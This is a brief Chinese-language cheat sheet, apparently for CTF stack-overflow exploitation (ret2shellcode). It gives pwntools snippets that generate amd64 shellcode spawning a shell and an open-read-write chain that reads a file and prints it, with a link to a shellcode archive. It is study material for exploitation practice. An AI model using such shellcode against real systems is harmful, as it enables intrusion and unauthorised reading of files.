---
title: ret2shellcode
category: 栈溢出
---

### 生成 shellcode

- 设置架构

```python
context.arch = 'amd64'
```

- 生成 shellcode

```python
shellcode = asm(shellcraft.sh())
```

### ORW

```python
shellcode  = shellcraft.amd64.linux.open('PATH')
shellcode += shellcraft.amd64.linux.read('rax', 'rsp', 0x30)
shellcode += shellcraft.amd64.linux.write(1 , 'rsp' , 0x30)
shellcode  = asm(shellcode)
```

### 相关链接

- http://shell-storm.org/shellcode/ 